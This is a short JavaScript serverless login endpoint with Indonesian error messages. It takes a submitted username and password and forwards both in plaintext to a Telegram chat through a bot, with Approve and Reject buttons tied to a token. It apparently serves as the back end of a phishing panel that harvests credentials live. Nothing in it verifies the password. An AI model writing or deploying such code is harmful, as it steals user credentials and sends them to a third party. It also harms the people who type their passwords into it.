// api/login.js

import crypto from "crypto"

global.pendingStore ??= new Map()

export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      error: "Method not allowed"
    })
  }

  try {

    const {
      username,
      password
    } = req.body

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: "Username dan password wajib diisi"
      })
    }

    const token =
      crypto.randomBytes(16).toString("hex")

    global.pendingStore.set(token, {
      username,
      password,
      status: "pending",
      createdAt: Date.now()
    })

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text:
`🔐 LOGIN REQUEST

👤 Username: ${username}
🔑 Password: ${password}

Token:
${token}`,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "✅ Approve",
                  callback_data: `approve:${token}`
                },
                {
                  text: "❌ Reject",
                  callback_data: `reject:${token}`
                }
              ]
            ]
          }
        })
      }
    )

    const telegramData =
      await telegramRes.json()

    if (!telegramData.ok) {
      throw new Error(
        telegramData.description
      )
    }

    return res.status(200).json({
      success: true,
      token
    })

  } catch (err) {

    console.error(err)

    return res.status(500).json({
      success: false,
      error: err.message
    })
  }
}

export const pendingStore =
  global.pendingStore
